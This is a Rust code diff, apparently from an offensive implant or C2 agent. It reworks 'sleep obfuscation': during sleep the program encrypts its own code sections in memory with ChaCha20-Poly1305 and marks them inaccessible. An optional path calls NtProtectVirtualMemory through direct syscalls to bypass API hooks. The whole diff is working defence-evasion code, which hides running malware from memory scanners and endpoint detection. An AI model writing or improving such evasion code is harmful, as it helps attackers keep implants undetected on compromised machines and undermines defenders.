@@ -123,22 +123,105 @@ pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Res
 }
 
 pub mod crypto {
-    #[cfg(windows)]
-    use chacha20::{
-        cipher::{KeyIvInit, StreamCipher},
-        ChaCha20,
+    use chacha20poly1305::{
+        aead::{Aead, KeyInit},
+        ChaCha20Poly1305, Nonce,
     };
     use rand::RngCore;
 
+    struct EncryptedSection {
+        addr: *mut u8,
+        size: usize,
+        // Windows: PAGE_* constants. Unix: libc::PROT_* flags stored as u32.
+        orig_prot: u32,
+        // nonce (12) + ciphertext + tag (16)
+        encrypted_blob: Vec<u8>,
+    }
+
     thread_local! {
         static SESSION_KEY: std::cell::RefCell<[u8; 32]> = const { std::cell::RefCell::new([0; 32]) };
-        // Per-session random nonce for ChaCha20.  Generated alongside the key
-        // in encrypt_sections() and consumed in decrypt_sections().  A fresh
-        // nonce each cycle eliminates any keystream-reuse risk.
-        static SESSION_NONCE: std::cell::RefCell<[u8; 12]> = const { std::cell::RefCell::new([0; 12]) };
         // Set to true after a successful encrypt_sections() so decrypt_sections()
         // can refuse to run with a zero key.
         static SESSION_INITIALIZED: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
+        static ENCRYPTED_SECTIONS: std::cell::RefCell<Vec<EncryptedSection>> = const { std::cell::RefCell::new(Vec::new()) };
+    }
+
+    fn wipe_vec_volatile(buf: &mut Vec<u8>) {
+        for b in buf.iter_mut() {
+            unsafe { std::ptr::write_volatile(b, 0u8) };
+        }
+        let mut to_drop = Vec::new();
+        std::mem::swap(buf, &mut to_drop);
+        drop(to_drop);
+    }
+
+    fn clear_encrypted_sections() {
+        ENCRYPTED_SECTIONS.with(|sections| {
+            let mut sections = sections.borrow_mut();
+            for section in sections.iter_mut() {
+                wipe_vec_volatile(&mut section.encrypted_blob);
+            }
+            sections.clear();
+            sections.shrink_to_fit();
+        });
+    }
+
+    #[cfg(windows)]
+    unsafe fn protect_region(addr: *mut u8, size: usize, new_protect: u32, old_protect: &mut u32) -> bool {
+        let mut region_size = size;
+        let mut base_addr = addr as *mut winapi::ctypes::c_void;
+
+        #[cfg(feature = "direct-syscalls")]
+        {
+            let status = crate::syscalls::syscall_NtProtectVirtualMemory(
+                (-1isize) as usize as u64,
+                &mut base_addr as *mut _ as usize as u64,
+                &mut region_size as *mut _ as usize as u64,
+                new_protect as u64,
+                old_protect as *mut _ as usize as u64,
+            );
+            if status != 0 {
+                log::error!(
+                    "NtProtectVirtualMemory failed for {:p} (size={}) with status {}",
+                    addr,
+                    size,
+                    status
+                );
+                return false;
+            }
+            true
+        }
+        #[cfg(not(feature = "direct-syscalls"))]
+        {
+            if winapi::um::memoryapi::VirtualProtect(base_addr, region_size, new_protect, old_protect) == 0 {
+                log::error!(
+                    "VirtualProtect failed for {:p} (size={}): {}",
+                    addr,
+                    size,
+                    std::io::Error::last_os_error()
+                );
+                return false;
+            }
+            true
+        }
+    }
+
+    #[cfg(not(windows))]
+    unsafe fn protect_region(addr: *mut u8, size: usize, prot: i32) -> bool {
+        let page_size = libc::sysconf(libc::_SC_PAGESIZE);
+        let page_size = if page_size > 0 { page_size as usize } else { 4096usize };
+        let aligned = (addr as usize) & !(page_size - 1);
+        let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
+        if libc::mprotect(aligned as *mut libc::c_void, aligned_size, prot) != 0 {
+            log::error!(
+                "mprotect failed for {:p} (size={}): {}",
+                addr,
+                size,
+                std::io::Error::last_os_error()
+            );
+            return false;
+        }
+        true
     }
 
     #[cfg(windows)]
@@ -263,67 +346,73 @@ pub mod crypto {
 
         #[cfg(not(feature = "memory-guard"))]
         unsafe {
+            clear_encrypted_sections();
+            SESSION_INITIALIZED.with(|c| c.set(false));
+
             let mut key = [0u8; 32];
             rand::thread_rng().fill_bytes(&mut key);
-            let mut nonce = [0u8; 12];
-            rand::thread_rng().fill_bytes(&mut nonce);
             SESSION_KEY.with(|k| {
                 *k.borrow_mut() = key;
             });
-            SESSION_NONCE.with(|n| {
-                *n.borrow_mut() = nonce;
-            });
-            SESSION_INITIALIZED.with(|c| c.set(true));
 
-            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
+            let mut encrypted_count = 0usize;
 
-            // Zero local key/nonce variables
-            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
-            std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);
+            for (addr, size) in get_code_sections() {
+                if addr.is_null() || size == 0 {
+                    continue;
+                }
 
-            for (addr, mut size) in get_code_sections() {
                 let mut old_protect = 0u32;
-                let mut base_addr = addr as *mut winapi::ctypes::c_void;
-
-                #[cfg(feature = "direct-syscalls")]
-                {
-                    let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
-                        (-1isize) as usize as u64,
-                        &mut base_addr as *mut _ as usize as u64,
-                        &mut size as *mut _ as usize as u64,
-                        winapi::um::winnt::PAGE_READWRITE as u64,
-                        &mut old_protect as *mut _ as usize as u64,
-                    );
-                }
-                #[cfg(not(feature = "direct-syscalls"))]
-                {
-                    winapi::um::memoryapi::VirtualProtect(
-                        base_addr,
-                        size,
-                        winapi::um::winnt::PAGE_READWRITE,
-                        &mut old_protect,
-                    );
+                if !protect_region(addr, size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect) {
+                    continue;
                 }
 
-                let slice = std::slice::from_raw_parts_mut(addr, size);
-                cipher.apply_keystream(slice);
+                let mut nonce_bytes = [0u8; 12];
+                rand::thread_rng().fill_bytes(&mut nonce_bytes);
+                let cipher = ChaCha20Poly1305::new((&key).into());
+                let plaintext = std::slice::from_raw_parts(addr, size);
 
-                let mut temp = 0u32;
-                #[cfg(feature = "direct-syscalls")]
-                {
-                    let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
-                        (-1isize) as usize as u64,
-                        &mut base_addr as *mut _ as usize as u64,
-                        &mut size as *mut _ as usize as u64,
-                        old_protect as u64,
-                        &mut temp as *mut _ as usize as u64,
-                    );
+                match cipher.encrypt(Nonce::from_slice(&nonce_bytes), plaintext) {
+                    Ok(mut ciphertext_and_tag) => {
+                        let mut encrypted_blob = Vec::with_capacity(12 + ciphertext_and_tag.len());
+                        encrypted_blob.extend_from_slice(&nonce_bytes);
+                        encrypted_blob.append(&mut ciphertext_and_tag);
+
+                        // Remove plaintext from code pages before switching to NOACCESS.
+                        std::ptr::write_bytes(addr, 0, size);
+
+                        let mut temp = 0u32;
+                        if !protect_region(addr, size, winapi::um::winnt::PAGE_NOACCESS, &mut temp) {
+                            let _ = protect_region(addr, size, old_protect, &mut temp);
+                            wipe_vec_volatile(&mut encrypted_blob);
+                        } else {
+                            ENCRYPTED_SECTIONS.with(|sections| {
+                                sections.borrow_mut().push(EncryptedSection {
+                                    addr,
+                                    size,
+                                    orig_prot: old_protect,
+                                    encrypted_blob,
+                                });
+                            });
+                            encrypted_count += 1;
+                        }
+                    }
+                    Err(e) => {
+                        log::error!(
+                            "encrypt_sections: AEAD encryption failed for section {:p}: {}",
+                            addr,
+                            e
+                        );
+                        let mut temp = 0u32;
+                        let _ = protect_region(addr, size, old_protect, &mut temp);
+                    }
                 }
-                #[cfg(not(feature = "direct-syscalls"))]
-                {
-                    winapi::um::memoryapi::VirtualProtect(base_addr, size, old_protect, &mut temp);
-                }
+
+                std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
             }
+
+            SESSION_INITIALIZED.with(|c| c.set(encrypted_count > 0));
+            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
         }
     }
 
@@ -342,146 +431,240 @@ pub mod crypto {
                 return;
             }
             SESSION_INITIALIZED.with(|c| c.set(false));
+
             let mut key = [0u8; 32];
             SESSION_KEY.with(|k| {
                 key = *k.borrow();
-            });
-            let mut nonce = [0u8; 12];
-            SESSION_NONCE.with(|n| {
-                nonce = *n.borrow();
+                *k.borrow_mut() = [0u8; 32];
             });
 
-            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
+            let mut sections = ENCRYPTED_SECTIONS.with(|sections| std::mem::take(&mut *sections.borrow_mut()));
+            for section in sections.iter_mut() {
+                if section.addr.is_null() || section.size == 0 {
+                    wipe_vec_volatile(&mut section.encrypted_blob);
+                    continue;
+                }
+
+                let mut rw_prev = 0u32;
+                if !protect_region(
+                    section.addr,
+                    section.size,
+                    winapi::um::winnt::PAGE_READWRITE,
+                    &mut rw_prev,
+                ) {
+                    wipe_vec_volatile(&mut section.encrypted_blob);
+                    continue;
+                }
+
+                if section.encrypted_blob.len() < 12 + 16 {
+                    log::error!(
+                        "decrypt_sections: malformed encrypted blob for section {:p}",
+                        section.addr
+                    );
+                    let mut tmp = 0u32;
+                    let _ = protect_region(section.addr, section.size, winapi::um::winnt::PAGE_NOACCESS, &mut tmp);
+                    wipe_vec_volatile(&mut section.encrypted_blob);
+                    continue;
+                }
+
+                let cipher = ChaCha20Poly1305::new((&key).into());
+                let nonce = Nonce::from_slice(&section.encrypted_blob[..12]);
+                let ciphertext_with_tag = &section.encrypted_blob[12..];
+
+                match cipher.decrypt(nonce, ciphertext_with_tag) {
+                    Ok(mut plaintext) => {
+                        if plaintext.len() != section.size {
+                            log::error!(
+                                "decrypt_sections: plaintext length mismatch for section {:p} (got {}, expected {})",
+                                section.addr,
+                                plaintext.len(),
+                                section.size
+                            );
+                            let mut tmp = 0u32;
+                            let _ = protect_region(section.addr, section.size, winapi::um::winnt::PAGE_NOACCESS, &mut tmp);
+                        } else {
+                            std::ptr::copy_nonoverlapping(
+                                plaintext.as_ptr(),
+                                section.addr,
+                                section.size,
+                            );
+
+                            let mut restore_prev = 0u32;
+                            let _ = protect_region(section.addr, section.size, section.orig_prot, &mut restore_prev);
+                        }
+
+                        for b in plaintext.iter_mut() {
+                            std::ptr::write_volatile(b, 0u8);
+                        }
+                    }
+                    Err(e) => {
+                        log::error!(
+                            "decrypt_sections: authentication failed for section {:p}: {}",
+                            section.addr,
+                            e
+                        );
+                        // Keep section inaccessible if authentication fails.
+                        let mut tmp = 0u32;
+                        let _ = protect_region(section.addr, section.size, winapi::um::winnt::PAGE_NOACCESS, &mut tmp);
+                    }
+                }
+
+                wipe_vec_volatile(&mut section.encrypted_blob);
+            }
 
             std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
-            std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);
-
-            for (addr, mut size) in get_code_sections() {
-                let mut old_protect = 0u32;
-                let mut base_addr = addr as *mut winapi::ctypes::c_void;
-
-                #[cfg(feature = "direct-syscalls")]
-                {
-                    let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
-                        (-1isize) as usize as u64,
-                        &mut base_addr as *mut _ as usize as u64,
-                        &mut size as *mut _ as usize as u64,
-                        winapi::um::winnt::PAGE_READWRITE as u64,
-                        &mut old_protect as *mut _ as usize as u64,
-                    );
-                }
-                #[cfg(not(feature = "direct-syscalls"))]
-                {
-                    winapi::um::memoryapi::VirtualProtect(
-                        base_addr,
-                        size,
-                        winapi::um::winnt::PAGE_READWRITE,
-                        &mut old_protect,
-                    );
-                }
-
-                let slice = std::slice::from_raw_parts_mut(addr, size);
-                cipher.apply_keystream(slice);
-
-                let mut temp = 0u32;
-                #[cfg(feature = "direct-syscalls")]
-                {
-                    let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
-                        (-1isize) as usize as u64,
-                        &mut base_addr as *mut _ as usize as u64,
-                        &mut size as *mut _ as usize as u64,
-                        old_protect as u64,
-                        &mut temp as *mut _ as usize as u64,
-                    );
-                }
-                #[cfg(not(feature = "direct-syscalls"))]
-                {
-                    winapi::um::memoryapi::VirtualProtect(base_addr, size, old_protect, &mut temp);
-                }
-            }
         }
     }
 
     #[cfg(not(windows))]
     pub fn encrypt_sections() {
-        use chacha20::{
-            cipher::{KeyIvInit, StreamCipher},
-            ChaCha20,
-        };
         unsafe {
+            clear_encrypted_sections();
+            SESSION_INITIALIZED.with(|c| c.set(false));
+
             let mut key = [0u8; 32];
             rand::thread_rng().fill_bytes(&mut key);
             SESSION_KEY.with(|k| {
                 *k.borrow_mut() = key;
             });
-            SESSION_INITIALIZED.with(|c| c.set(true));
-            let mut nonce = [0u8; 12];
-            rand::thread_rng().fill_bytes(&mut nonce);
-            SESSION_NONCE.with(|n| {
-                *n.borrow_mut() = nonce;
-            });
-            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
-            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
-            std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);
-            let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
-            for (addr, size, _orig_prot) in get_code_sections() {
-                let aligned = (addr as usize) & !(page_size - 1);
-                let aligned_size =
-                    ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
-                libc::mprotect(
-                    aligned as *mut libc::c_void,
-                    aligned_size,
-                    libc::PROT_READ | libc::PROT_WRITE,
-                );
-                let slice = std::slice::from_raw_parts_mut(addr, size);
-                cipher.apply_keystream(slice);
-                // Encrypted: keep PROT_READ during sleep so signal handlers can
-                // still read (but not execute) this region.  PROT_NONE would cause
-                // SIGSEGV if any signal arrives while the section is unmapped.
-                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ);
+
+            let mut encrypted_count = 0usize;
+            for (addr, size, orig_prot) in get_code_sections() {
+                if addr.is_null() || size == 0 {
+                    continue;
+                }
+
+                if !protect_region(addr, size, libc::PROT_READ | libc::PROT_WRITE) {
+                    continue;
+                }
+
+                let mut nonce_bytes = [0u8; 12];
+                rand::thread_rng().fill_bytes(&mut nonce_bytes);
+                let cipher = ChaCha20Poly1305::new((&key).into());
+                let plaintext = std::slice::from_raw_parts(addr, size);
+
+                match cipher.encrypt(Nonce::from_slice(&nonce_bytes), plaintext) {
+                    Ok(mut ciphertext_and_tag) => {
+                        let mut encrypted_blob = Vec::with_capacity(12 + ciphertext_and_tag.len());
+                        encrypted_blob.extend_from_slice(&nonce_bytes);
+                        encrypted_blob.append(&mut ciphertext_and_tag);
+
+                        // Remove plaintext from memory before setting PROT_NONE.
+                        std::ptr::write_bytes(addr, 0, size);
+
+                        if !protect_region(addr, size, libc::PROT_NONE) {
+                            let _ = protect_region(addr, size, orig_prot);
+                            wipe_vec_volatile(&mut encrypted_blob);
+                        } else {
+                            ENCRYPTED_SECTIONS.with(|sections| {
+                                sections.borrow_mut().push(EncryptedSection {
+                                    addr,
+                                    size,
+                                    orig_prot: orig_prot as u32,
+                                    encrypted_blob,
+                                });
+                            });
+                            encrypted_count += 1;
+                        }
+                    }
+                    Err(e) => {
+                        log::error!(
+                            "encrypt_sections: AEAD encryption failed for section {:p}: {}",
+                            addr,
+                            e
+                        );
+                        let _ = protect_region(addr, size, orig_prot);
+                    }
+                }
+
+                std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; 12]);
             }
+
+            SESSION_INITIALIZED.with(|c| c.set(encrypted_count > 0));
+            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
         }
     }
 
     #[cfg(not(windows))]
     pub fn decrypt_sections() {
-        use chacha20::{
-            cipher::{KeyIvInit, StreamCipher},
-            ChaCha20,
-        };
         unsafe {
             if !SESSION_INITIALIZED.with(|c| c.get()) {
                 log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
                 return;
             }
             SESSION_INITIALIZED.with(|c| c.set(false));
+
             let mut key = [0u8; 32];
             SESSION_KEY.with(|k| {
                 key = *k.borrow();
+                *k.borrow_mut() = [0u8; 32];
             });
-            let mut nonce = [0u8; 12];
-            SESSION_NONCE.with(|n| {
-                nonce = *n.borrow();
-            });
-            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
-            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
-            std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);
-            let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
-            for (addr, size, orig_prot) in get_code_sections() {
-                let aligned = (addr as usize) & !(page_size - 1);
-                let aligned_size =
-                    ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
-                libc::mprotect(
-                    aligned as *mut libc::c_void,
-                    aligned_size,
-                    libc::PROT_READ | libc::PROT_WRITE,
-                );
-                let slice = std::slice::from_raw_parts_mut(addr, size);
-                cipher.apply_keystream(slice);
-                // Restore the original protection — PROT_READ|PROT_EXEC for .text,
-                // PROT_READ for .rodata/.data (L-03 fix; was always PROT_READ|PROT_EXEC).
-                libc::mprotect(aligned as *mut libc::c_void, aligned_size, orig_prot);
+
+            let mut sections = ENCRYPTED_SECTIONS.with(|sections| std::mem::take(&mut *sections.borrow_mut()));
+            for section in sections.iter_mut() {
+                if section.addr.is_null() || section.size == 0 {
+                    wipe_vec_volatile(&mut section.encrypted_blob);
+                    continue;
+                }
+
+                if !protect_region(section.addr, section.size, libc::PROT_READ | libc::PROT_WRITE)
+                {
+                    wipe_vec_volatile(&mut section.encrypted_blob);
+                    continue;
+                }
+
+                if section.encrypted_blob.len() < 12 + 16 {
+                    log::error!(
+                        "decrypt_sections: malformed encrypted blob for section {:p}",
+                        section.addr
+                    );
+                    let _ = protect_region(section.addr, section.size, libc::PROT_NONE);
+                    wipe_vec_volatile(&mut section.encrypted_blob);
+                    continue;
+                }
+
+                let cipher = ChaCha20Poly1305::new((&key).into());
+                let nonce = Nonce::from_slice(&section.encrypted_blob[..12]);
+                let ciphertext_with_tag = &section.encrypted_blob[12..];
+
+                match cipher.decrypt(nonce, ciphertext_with_tag) {
+                    Ok(mut plaintext) => {
+                        if plaintext.len() != section.size {
+                            log::error!(
+                                "decrypt_sections: plaintext length mismatch for section {:p} (got {}, expected {})",
+                                section.addr,
+                                plaintext.len(),
+                                section.size
+                            );
+                            let _ = protect_region(section.addr, section.size, libc::PROT_NONE);
+                        } else {
+                            std::ptr::copy_nonoverlapping(
+                                plaintext.as_ptr(),
+                                section.addr,
+                                section.size,
+                            );
+                            let _ = protect_region(section.addr, section.size, section.orig_prot as i32);
+                        }
+
+                        for b in plaintext.iter_mut() {
+                            std::ptr::write_volatile(b, 0u8);
+                        }
+                    }
+                    Err(e) => {
+                        log::error!(
+                            "decrypt_sections: authentication failed for section {:p}: {}",
+                            section.addr,
+                            e
+                        );
+                        // Keep section inaccessible if authentication fails.
+                        let _ = protect_region(section.addr, section.size, libc::PROT_NONE);
+                    }
+                }
+
+                wipe_vec_volatile(&mut section.encrypted_blob);
             }
+
+            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
         }
     }
 }
